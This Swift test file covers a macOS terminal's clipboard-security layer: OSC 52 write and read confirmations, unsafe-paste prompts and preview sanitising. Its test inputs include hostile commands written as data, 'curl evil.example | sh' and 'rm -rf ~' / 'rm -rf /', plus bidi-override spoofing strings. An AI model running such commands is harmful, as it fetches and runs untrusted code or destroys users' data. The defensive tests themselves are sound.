import AppKit
import AwesoMuxConfig
import AwesoMuxTestSupport
import GhosttyKit
import Testing
@testable import awesoMux

/// Stand-in for the write-confirmation dialog: records every prompt and holds
/// each open until the test closes it by text, so burst tests can control
/// interleaving (and the reset test can hold two dialogs open at once).
@MainActor
private final class ClipboardDialogRecorder {
    private(set) var promptedTexts: [String] = []
    private(set) var openPrompts: [String: CheckedContinuation<Bool, Never>] = [:]

    var openPrompt: String? { openPrompts.keys.first }

    func present(_ text: String) async -> Bool {
        promptedTexts.append(text)
        return await withCheckedContinuation { openPrompts[text] = $0 }
    }

    func close(_ text: String, confirmed: Bool) {
        openPrompts.removeValue(forKey: text)?.resume(returning: confirmed)
    }

    func closeAll(confirmed: Bool) {
        let all = openPrompts
        openPrompts = [:]
        for continuation in all.values {
            continuation.resume(returning: confirmed)
        }
    }
}

/// Bounded poll for the burst tests: a state-machine regression records a
/// failure instead of hanging the serialized suite. On timeout the gate and
/// the recorder are drained so `async let` writes still complete, letting the
/// test return instead of wedging at its implicit child-task await.
@MainActor
private func awaitCondition(
    _ what: String,
    draining dialog: ClipboardDialogRecorder,
    _ condition: @MainActor () -> Bool
) async -> Bool {
    guard !(await waitUntil(attempts: 100_000, condition)) else { return true }
    Issue.record("timed out waiting for \(what)")
    GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
    dialog.closeAll(confirmed: false)
    return false
}

// Serialized: every test swaps the shared static confirmation provider and
// alert flags; the burst tests below also hold a fake dialog open across
// suspension points, so a parallel test's reset would strand them mid-wait.
@MainActor
@Suite("Ghostty clipboard write policy", .serialized)
struct GhosttyClipboardBridgeTests {
    @Test("allow policy writes without asking")
    func allowPolicyWritesWithoutAsking() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            Issue.record("Allow policy should not ask for confirmation")
            return false
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .allow, confirm: true))
    }

    @Test("deny policy drops confirmed writes without asking")
    func denyPolicyDropsConfirmedWritesWithoutAsking() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            Issue.record("Deny policy should not ask for confirmation")
            return true
        }

        #expect(!(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .deny, confirm: true)))
    }

    @Test("unconfirmed writes preserve local copy behavior")
    func unconfirmedWritesPreserveLocalCopyBehavior() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            Issue.record("Unconfirmed writes should not ask for confirmation")
            return false
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .ask, confirm: false))
        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .deny, confirm: false))
    }

    @Test("ask policy writes only when confirmation approves")
    func askPolicyWritesOnlyWhenConfirmationApproves() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            #expect(text == "payload")
            return true
        }
        #expect(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .ask, confirm: true))

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in false }
        #expect(!(await GhosttyRuntime.shouldWriteClipboard("payload", policy: .ask, confirm: true)))
    }

    @Test("ask policy drops duplicate writes while a confirmation is open")
    func askPolicyDropsDuplicateConcurrentWrites() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, _ in
            #expect(GhosttyRuntime.isClipboardWriteAlertPresented)
            #expect(!(await GhosttyRuntime.shouldWriteClipboard("outer", policy: .ask, confirm: true)))
            return true
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard("outer", policy: .ask, confirm: true))
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("ask policy re-prompts a distinct write after the open dialog closes")
    func askPolicyReasksQueuedDistinctWrite() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let dialog = ClipboardDialogRecorder()
        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            await dialog.present(text)
        }

        async let first = GhosttyRuntime.shouldWriteClipboard("first", policy: .ask, confirm: true)
        guard await awaitCondition("first prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }

        async let second = GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)
        guard
            await awaitCondition(
                "second write parked", draining: dialog,
                {
                    GhosttyRuntime.pendingClipboardWriteTextForTesting == "second"
                })
        else { return }

        // A duplicate of the waiting write drops immediately, without a slot.
        #expect(!(await GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)))

        dialog.close("first", confirmed: true)
        #expect(await first)
        guard await awaitCondition("second prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }
        dialog.close("second", confirmed: true)
        #expect(await second)
        #expect(dialog.promptedTexts == ["first", "second"])
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("newer distinct write supersedes the waiting one")
    func askPolicySupersedesOlderPendingWrite() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let dialog = ClipboardDialogRecorder()
        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            await dialog.present(text)
        }

        async let first = GhosttyRuntime.shouldWriteClipboard("first", policy: .ask, confirm: true)
        guard await awaitCondition("first prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }

        async let second = GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)
        guard
            await awaitCondition(
                "second write parked", draining: dialog,
                {
                    GhosttyRuntime.pendingClipboardWriteTextForTesting == "second"
                })
        else { return }

        async let third = GhosttyRuntime.shouldWriteClipboard("third", policy: .ask, confirm: true)
        guard
            await awaitCondition(
                "third write superseding second", draining: dialog,
                {
                    GhosttyRuntime.pendingClipboardWriteTextForTesting == "third"
                })
        else { return }

        #expect(!(await second))

        dialog.close("first", confirmed: false)
        #expect(!(await first))
        guard await awaitCondition("third prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }
        dialog.close("third", confirmed: true)
        #expect(await third)
        #expect(dialog.promptedTexts == ["first", "third"])
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("stale cleanup after a reset does not clobber the rebuilt gate")
    func staleCleanupAfterResetLeavesGateIntact() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let dialog = ClipboardDialogRecorder()
        let installRecorder = { @MainActor in
            GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
                await dialog.present(text)
            }
        }
        installRecorder()

        async let first = GhosttyRuntime.shouldWriteClipboard("first", policy: .ask, confirm: true)
        guard await awaitCondition("first prompt", draining: dialog, { dialog.openPrompt != nil }) else { return }

        // Rebuild the gate while "first" is still suspended in its dialog —
        // the shape of a reset racing an open confirmation.
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        installRecorder()

        async let second = GhosttyRuntime.shouldWriteClipboard("second", policy: .ask, confirm: true)
        guard
            await awaitCondition(
                "second prompt", draining: dialog,
                {
                    dialog.openPrompts["second"] != nil
                })
        else { return }

        // Closing the pre-reset dialog must not release the gate "second" owns.
        dialog.close("first", confirmed: false)
        #expect(!(await first))
        #expect(GhosttyRuntime.isClipboardWriteAlertPresented)

        // The rebuilt gate still queues: a distinct write parks rather than
        // presenting a stacked dialog.
        async let third = GhosttyRuntime.shouldWriteClipboard("third", policy: .ask, confirm: true)
        guard
            await awaitCondition(
                "third write parked", draining: dialog,
                {
                    GhosttyRuntime.pendingClipboardWriteTextForTesting == "third"
                })
        else { return }

        dialog.close("second", confirmed: true)
        #expect(await second)
        guard
            await awaitCondition(
                "third prompt", draining: dialog,
                {
                    dialog.openPrompts["third"] != nil
                })
        else { return }
        dialog.close("third", confirmed: true)
        #expect(await third)
        #expect(!GhosttyRuntime.isClipboardWriteAlertPresented)
    }

    @Test("oversize write still reaches the confirmation prompt")
    func oversizeWriteStillPrompts() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let oversize = String(repeating: "a", count: 2 * 1024 * 1024)
        GhosttyRuntime.clipboardWriteConfirmationProvider = { text, _, _ in
            #expect(text.utf8.count == 2 * 1024 * 1024)
            return true
        }

        #expect(await GhosttyRuntime.shouldWriteClipboard(oversize, policy: .ask, confirm: true))
    }

    @Test("confirmation provider receives the source window")
    func confirmationProviderReceivesSourceWindow() async {
        GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting()
        defer { GhosttyRuntime.resetClipboardWriteConfirmationProviderForTesting() }

        let window = NSWindow(
            contentRect: NSRect(x: 0, y: 0, width: 100, height: 100),
            styleMask: [.titled],
            backing: .buffered,
            defer: true
        )
        GhosttyRuntime.clipboardWriteConfirmationProvider = { _, _, parentWindow in
            #expect(parentWindow === window)
            return true
        }

        #expect(
            await GhosttyRuntime.shouldWriteClipboard(
                "payload",
                policy: .ask,
                confirm: true,
                parentWindow: window
            ))
    }

    @Test("confirmation body sanitizes preview")
    func confirmationBodySanitizesPreview() {
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: "git clone https://good.example\nrm -rf ~\u{202E}txt"
        )

        #expect(body.contains("Preview: git clone https://good.example rm -rf ~ txt"))
        #expect(!body.contains("\nrm -rf"))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x202E)!))
    }

    @Test("confirmation body strips invisible formatting codepoints")
    func confirmationBodyStripsInvisibleFormatting() {
        // ZWJ, ZWNJ, and a variation selector are invisible — left in, the
        // rendered preview would differ from the bytes actually written,
        // letting a hostile OSC 52 payload spoof a benign-looking host.
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: "good\u{200D}\u{200C}.example\u{FE0F}"
        )

        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x200D)!))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x200C)!))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0xFE0F)!))
    }

    @Test("confirmation body includes source context")
    func confirmationBodyIncludesSourceContext() {
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: "payload",
            sourceDescription: "workspace release\npane \u{202E}123"
        )

        #expect(body.contains("Source: workspace release pane 123"))
        #expect(!body.contains("\npane"))
        #expect(!body.unicodeScalars.contains(Unicode.Scalar(0x202E)!))
    }

    @Test("confirmation body bounds huge preview")
    func confirmationBodyBoundsHugePreview() {
        let body = GhosttyRuntime.clipboardWriteConfirmationBody(
            for: String(repeating: "a", count: 10_000)
        )

        #expect(body.contains("Preview: \(String(repeating: "a", count: 160))…"))
        #expect(body.count < 400)
    }

    @Test("unsafe paste confirmation body previews the pending paste content")
    func unsafePasteConfirmationBodyPreviewsContent() {
        let body = GhosttyRuntime.unsafePasteConfirmationBody(for: "curl evil.example | sh")

        #expect(body.contains("Preview: curl evil.example | sh"))
    }

    @Test("unsafe paste confirmation body sanitizes and bounds like the write dialog")
    func unsafePasteConfirmationBodyMirrorsWriteDialogLimits() {
        // Same sanitizer, same limits as clipboardWriteConfirmationBody — a
        // hostile paste payload can't smuggle control chars or bidi
        // overrides into the dialog either.
        let sanitized = GhosttyRuntime.unsafePasteConfirmationBody(
            for: "git clone https://good.example\nrm -rf ~\u{202E}txt"
        )
        #expect(sanitized.contains("Preview: git clone https://good.example rm -rf ~ txt"))
        #expect(!sanitized.unicodeScalars.contains(Unicode.Scalar(0x202E)!))

        let bounded = GhosttyRuntime.unsafePasteConfirmationBody(
            for: String(repeating: "a", count: 10_000)
        )
        #expect(bounded == "Preview: \(String(repeating: "a", count: 160))…")
    }

    @Test("sanitized alert title falls back for an empty pane title")
    func sanitizedAlertTitleFallsBackForEmptyPaneTitle() {
        #expect(GhosttyRuntime.sanitizedAlertTitle("") == "\u{2068}This terminal\u{2069}")
        // Whitespace-only titles are effectively empty after compaction too.
        #expect(GhosttyRuntime.sanitizedAlertTitle("   ") == "\u{2068}This terminal\u{2069}")
    }

    @Test("sanitized alert title bidi-isolates a real pane title")
    func sanitizedAlertTitleBidiIsolatesRealTitle() {
        #expect(GhosttyRuntime.sanitizedAlertTitle("deploy pane") == "\u{2068}deploy pane\u{2069}")
    }

    @Test("nil userdata on read-confirm logs instead of silently dropping")
    func nilUserdataLogsInsteadOfDropping() {
        #expect(
            GhosttyRuntime.describeNilUserdataReadConfirm()
                == "confirmReadClipboard called with nil userdata — pending libghostty read request cannot be completed (no surface handle available)"
        )
    }

    @Test("nil userdata on read-start logs instead of silently dropping")
    func nilUserdataOnReadStartLogsInsteadOfDropping() {
        #expect(
            GhosttyRuntime.describeNilUserdataReadClipboard()
                == "readClipboard called with nil userdata — libghostty invoked the callback without a registered surface view (request cannot start)"
        )
    }

    @Test("OSC 52 read confirmation asks before completing with clipboard data")
    func osc52ReadConfirmationAsksBeforeCompleting() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        var promptedTitle: String?
        GhosttyRuntime.clipboardReadConfirmationProvider = { title, parentWindow in
            #expect(parentWindow == nil)
            promptedTitle = title
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "clipboard payload",
            requestKind: .osc52Read,
            paneTitle: "deploy pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(promptedTitle == "deploy pane")
        #expect(completions.count == 1)
        #expect(completions.first?.data == "clipboard payload")
        #expect(completions.first?.confirmed == true)
    }

    @Test("OSC 52 read confirmation still asks for empty clipboard payload")
    func osc52ReadConfirmationAsksForEmptyClipboardPayload() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        var promptCount = 0
        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            promptCount += 1
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "",
            requestKind: .osc52Read,
            paneTitle: "empty pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(promptCount == 1)
        #expect(completions.count == 1)
        #expect(completions.first?.data == "")
        #expect(completions.first?.confirmed == true)
    }

    @Test("confirm clipboard read disabled skips dialog and denies")
    func confirmClipboardReadDisabledSkipsDialogAndDenies() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            Issue.record("Disabled read confirmation should not ask")
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "clipboard payload",
            requestKind: .osc52Read,
            paneTitle: "deploy pane",
            parentWindow: nil,
            confirmClipboardRead: false
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(completions.count == 1)
        #expect(completions.first?.data == "")
        #expect(completions.first?.confirmed == false)
    }

    @Test("unsafe paste confirmation only handles paste requests")
    func unsafePasteConfirmationOnlyHandlesPasteRequests() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        var unsafePastePrompts = 0
        var promptedPasteData: String?
        GhosttyRuntime.unsafePasteConfirmationProvider = { data, parentWindow in
            #expect(parentWindow == nil)
            promptedPasteData = data
            unsafePastePrompts += 1
            return .confirmed
        }
        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            Issue.record("Read confirmation should not be part of this paste branch")
            return .cancelled
        }

        var pasteCompletions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "echo hi\n",
            requestKind: .paste,
            paneTitle: "paste pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            pasteCompletions.append((data, confirmed))
            return true
        }

        var writeCompletions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "ignored",
            requestKind: .osc52Write,
            paneTitle: "write pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            writeCompletions.append((data, confirmed))
            return true
        }

        #expect(unsafePastePrompts == 1)
        #expect(promptedPasteData == "echo hi\n")
        #expect(pasteCompletions.count == 1)
        #expect(pasteCompletions.first?.data == "echo hi\n")
        #expect(pasteCompletions.first?.confirmed == true)
        #expect(writeCompletions.count == 1)
        #expect(writeCompletions.first?.data == "")
        #expect(writeCompletions.first?.confirmed == false)
    }

    @Test("unsafe paste cancellation aborts the paste")
    func unsafePasteCancellationAbortsPaste() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.unsafePasteConfirmationProvider = { _, _ in .cancelled }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "echo hi\n",
            requestKind: .paste,
            paneTitle: "paste pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(completions.count == 1)
        #expect(completions.first?.data == "")
        #expect(completions.first?.confirmed == false)
    }

    @Test("read confirmation drops nested requests while alert is presented")
    func readConfirmationDropsNestedRequestsWhileAlertPresented() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in
            #expect(GhosttyRuntime.isClipboardReadAlertPresented)
            var nestedCompletions: [(data: String, confirmed: Bool)] = []
            await GhosttyRuntime.resolveClipboardConfirmationRequest(
                data: "nested",
                requestKind: .osc52Read,
                paneTitle: "nested pane",
                parentWindow: nil,
                confirmClipboardRead: true
            ) { data, confirmed in
                nestedCompletions.append((data, confirmed))
                return true
            }
            #expect(nestedCompletions.count == 1)
            #expect(nestedCompletions.first?.data == "")
            #expect(nestedCompletions.first?.confirmed == false)
            return .confirmed
        }

        var completions: [(data: String, confirmed: Bool)] = []
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "outer",
            requestKind: .osc52Read,
            paneTitle: "outer pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { data, confirmed in
            completions.append((data, confirmed))
            return true
        }

        #expect(completions.count == 1)
        #expect(completions.first?.data == "outer")
        #expect(completions.first?.confirmed == true)
        #expect(!GhosttyRuntime.isClipboardReadAlertPresented)
    }

    @Test("read confirmation tolerates a completion that never reaches the surface")
    func readConfirmationToleratesCompletionThatNeverReachesSurface() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.clipboardReadConfirmationProvider = { _, _ in .confirmed }

        var completionCallCount = 0
        // Returning false simulates GhosttySurfaceInputBridge.
        // completeClipboardRequest's `guard let surface else { return false }`
        // firing because the pane was torn down while its dialog was up.
        // resolveClipboardConfirmationRequest must not crash or hang, and the
        // dedup flag must still clear (asserted below via a follow-up request).
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "clipboard payload",
            requestKind: .osc52Read,
            paneTitle: "torn down pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { _, _ in
            completionCallCount += 1
            return false
        }

        #expect(completionCallCount == 1)
        #expect(!GhosttyRuntime.isClipboardReadAlertPresented)
    }

    @Test("unsafe paste confirmation tolerates a completion that never reaches the surface")
    func unsafePasteConfirmationToleratesCompletionThatNeverReachesSurface() async {
        GhosttyRuntime.resetClipboardConfirmationProvidersForTesting()
        defer { GhosttyRuntime.resetClipboardConfirmationProvidersForTesting() }

        GhosttyRuntime.unsafePasteConfirmationProvider = { _, _ in .confirmed }

        var completionCallCount = 0
        await GhosttyRuntime.resolveClipboardConfirmationRequest(
            data: "echo hi\n",
            requestKind: .paste,
            paneTitle: "torn down pane",
            parentWindow: nil,
            confirmClipboardRead: true
        ) { _, _ in
            completionCallCount += 1
            return false
        }

        #expect(completionCallCount == 1)
        #expect(!GhosttyRuntime.isUnsafePasteAlertPresented)
    }
}

/// Pure decoding tests for the borrowed confirm payload → dialog preview and
/// deliverable text. No shared state, so no serialization needed.
@Suite("Ghostty clipboard confirm payload decoding")
struct GhosttyClipboardConfirmPreviewTests {
    /// Builds a `ghostty_clipboard_confirm_s` over C memory that stays valid
    /// for the duration of `body`, mirroring how libghostty owns the payload
    /// only for its callback duration. A representation may pass an explicit
    /// `len` with `bytes: nil` — the corrupt shape libghostty never sends but
    /// a broken embedder could.
    private func withConfirm(
        _ representations: [(mime: String, bytes: [UInt8]?, len: Int?)],
        _ body: (ghostty_clipboard_confirm_s) -> Void
    ) {
        var contents: [ghostty_clipboard_content_s] = []
        var mimeCopies: [UnsafeMutablePointer<CChar>] = []
        var dataBuffers: [UnsafeMutableRawPointer] = []
        defer {
            mimeCopies.forEach { free($0) }
            dataBuffers.forEach { $0.deallocate() }
        }

        for representation in representations {
            guard let mime = strdup(representation.mime) else {
                Issue.record("strdup failed")
                continue
            }
            mimeCopies.append(mime)
            let bytes = representation.bytes
            var dataPointer: UnsafePointer<CChar>?
            if let bytes {
                let buffer = UnsafeMutableRawPointer.allocate(
                    byteCount: max(bytes.count, 1),
                    alignment: 1
                )
                dataBuffers.append(buffer)
                bytes.withUnsafeBufferPointer { source in
                    if let base = source.baseAddress {
                        buffer.copyMemory(from: base, byteCount: source.count)
                    }
                }
                dataPointer = UnsafePointer(buffer.assumingMemoryBound(to: CChar.self))
            }
            contents.append(
                ghostty_clipboard_content_s(
                    mime: mime,
                    data: dataPointer,
                    len: representation.len ?? bytes?.count ?? 0
                )
            )
        }

        contents.withUnsafeBufferPointer { contentsBuffer in
            let confirm = ghostty_clipboard_confirm_s(
                contents: contentsBuffer.baseAddress,
                contents_len: contentsBuffer.count,
                available: nil,
                available_len: 0,
                name: nil,
                can_remember: false
            )
            body(confirm)
        }
    }

    @Test("payload decodes the text/plain representation for preview and delivery")
    func payloadDecodesTextPlain() {
        withConfirm([("text/plain", Array("rm -rf /".utf8), nil)]) { confirm in
            let decoded = GhosttyRuntime.decodeClipboardConfirmPayload(from: confirm)
            #expect(decoded.preview == "rm -rf /")
            #expect(decoded.deliverableText == "rm -rf /")
        }
    }

    @Test("payload picks text/plain even when it is not first")
    func payloadPicksTextPlainAmongSiblings() {
        withConfirm([
            ("image/png", [0x89, 0x50], nil),
            ("text/plain", Array("hello".utf8), nil),
        ]) { confirm in
            let decoded = GhosttyRuntime.decodeClipboardConfirmPayload(from: confirm)
            #expect(decoded.preview == "hello")
            #expect(decoded.deliverableText == "hello")
        }
    }

    @Test("binary-only payload previews byte summaries and delivers nothing")
    func binaryOnlyPayloadPreviewsSummariesAndDeliversNothing() {
        withConfirm([
            ("image/png", [0x89, 0x50, 0x4E], nil),
            ("application/octet-stream", Array(repeating: UInt8(0), count: 12), nil),
        ]) { confirm in
            let decoded = GhosttyRuntime.decodeClipboardConfirmPayload(from: confirm)
            #expect(
                decoded.preview == "image/png (3 bytes)\napplication/octet-stream (12 bytes)"
            )
            // Confirming must deny rather than paste the summary text itself.
            #expect(decoded.deliverableText == nil)
        }
    }

    @Test("invalid UTF-8 text/plain previews a summary and delivers nothing")
    func invalidUtf8TextPlainDeliversNothing() {
        withConfirm([("text/plain", [0xFF, 0xFE], nil)]) { confirm in
            let decoded = GhosttyRuntime.decodeClipboardConfirmPayload(from: confirm)
            #expect(decoded.preview == "text/plain (2 bytes)")
            #expect(decoded.deliverableText == nil)
        }
    }

    @Test("nil data with non-zero length degrades to empty bytes, not a crash")
    func payloadTreatsNilDataWithLengthAsEmptyBytes() {
        // The crash shape from review: len > 0 with a nil pointer must not
        // trap; an empty Data decodes as "" for text/plain — still deliverable.
        withConfirm([("text/plain", nil, 7)]) { confirm in
            #expect(confirm.contents[0].len > 0)
            #expect(confirm.contents[0].data == nil)
            let decoded = GhosttyRuntime.decodeClipboardConfirmPayload(from: confirm)
            #expect(decoded.preview == "")
            #expect(decoded.deliverableText == "")
        }
    }

    @Test("empty payload previews as empty text and delivers nothing")
    func emptyPayloadPreviewsAsEmptyText() {
        withConfirm([]) { confirm in
            let decoded = GhosttyRuntime.decodeClipboardConfirmPayload(from: confirm)
            #expect(decoded.preview == "")
            #expect(decoded.deliverableText == nil)
        }
    }
}

/// The pure mime/list routing matrix for clipboard reads. If upstream ever
/// changes the mime strings it requests, these pin which shapes awesoMux
/// serves, lists, or refuses — a silent all-reads failure shows up here.
@Suite("Ghostty clipboard read routing")
struct GhosttyClipboardReadRoutingTests {
    private let text = "served payload"

    private func plan(
        _ mimes: [String],
        list: Bool = false,
        servable: String? = "served payload"
    ) -> GhosttyRuntime.ClipboardReadDelivery {
        GhosttyRuntime.planClipboardRead(
            requestedMimes: mimes,
            list: list,
            servableText: servable
        )
    }

    @Test("requested text/plain with servable content delivers it")
    func requestedTextPlainWithContentDelivers() {
        let delivery = plan(["text/plain"])
        #expect(delivery.deliverable)
        #expect(delivery.contents.map(\.mime) == ["text/plain"])
        #expect(delivery.contents.first?.data == Data(text.utf8))
        #expect(delivery.available.isEmpty)
    }

    @Test("listing flag adds the available listing alongside the delivery")
    func listingFlagAddsAvailable() {
        let delivery = plan(["text/plain"], list: true)
        #expect(delivery.deliverable)
        #expect(delivery.contents.map(\.mime) == ["text/plain"])
        #expect(delivery.contents.first?.data == Data(text.utf8))
        #expect(delivery.available == ["text/plain"])
    }

    @Test("unservable mime alone is refused without a listing")
    func unservableMimeAloneIsRefused() {
        let delivery = plan(["image/png"])
        #expect(!delivery.deliverable)
    }

    @Test("unservable mime with a listing still reports the available type")
    func unservableMimeWithListingReportsAvailable() {
        let delivery = plan(["image/png"], list: true)
        #expect(delivery.deliverable)
        #expect(delivery.contents.isEmpty)
        #expect(delivery.available == ["text/plain"])
    }

    @Test("pure listing request passes no mimes and lists what is servable")
    func pureListingRequestListsServableType() {
        let delivery = plan([], list: true)
        #expect(delivery.deliverable)
        #expect(delivery.contents.isEmpty)
        #expect(delivery.available == ["text/plain"])
    }

    @Test("pure listing request with an empty pasteboard completes empty")
    func pureListingWithEmptyPasteboardCompletesEmpty() {
        let delivery = plan([], list: true, servable: nil)
        #expect(delivery.deliverable)
        #expect(delivery.contents.isEmpty)
        #expect(delivery.available.isEmpty)
    }

    @Test("text/plain request against an empty pasteboard is refused")
    func textPlainAgainstEmptyPasteboardIsRefused() {
        let delivery = plan(["text/plain"], servable: nil)
        #expect(!delivery.deliverable)
    }

    @Test("mixed mimes deliver text/plain when servable")
    func mixedMimesDeliverTextPlain() {
        let delivery = plan(["image/png", "text/plain", "application/x-zsh"])
        #expect(delivery.deliverable)
        #expect(delivery.contents.map(\.mime) == ["text/plain"])
        #expect(delivery.contents.first?.data == Data(text.utf8))
    }

    @Test("empty pasteboard listing never invents an available type")
    func emptyPasteboardListingStaysEmpty() {
        let delivery = plan([], list: true, servable: nil)
        #expect(delivery.available.isEmpty)
        let refused = plan(["text/plain"], list: true, servable: nil)
        #expect(refused.available.isEmpty)
    }
}
